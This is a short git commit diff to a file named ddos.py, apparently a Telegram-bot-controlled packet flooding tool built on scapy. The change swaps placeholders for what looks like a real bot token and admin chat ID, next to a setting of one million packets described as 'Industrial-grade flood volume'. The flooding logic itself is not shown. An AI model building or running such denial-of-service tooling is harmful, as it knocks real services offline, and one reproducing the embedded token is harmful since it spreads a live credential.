a55df70bff067681029cb6bb1ce7e11fc981b8e0
moksnavarro7-ai <moksnavarro7@gmail.com>
2026-08-10 00:42:40 +0800

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -8,8 +8,8 @@ import time
 from scapy.all import IP, TCP, UDP, ICMP, send, raw
 from telebot import types
 
-TOKEN = "YOUR_ACTUAL_TOKEN"
-ADMIN_CHAT_ID = YOUR_ACTUAL_ID
+TOKEN = "8824864653:AAEmpXwgdiGLKqLq_VjiIcuvRbfFvcNbDHY"
+ADMIN_CHAT_ID = 8302326875
 MAX_PACKETS = 1000000  # Industrial-grade flood volume
 
 bot = telebot.TeleBot(TOKEN)
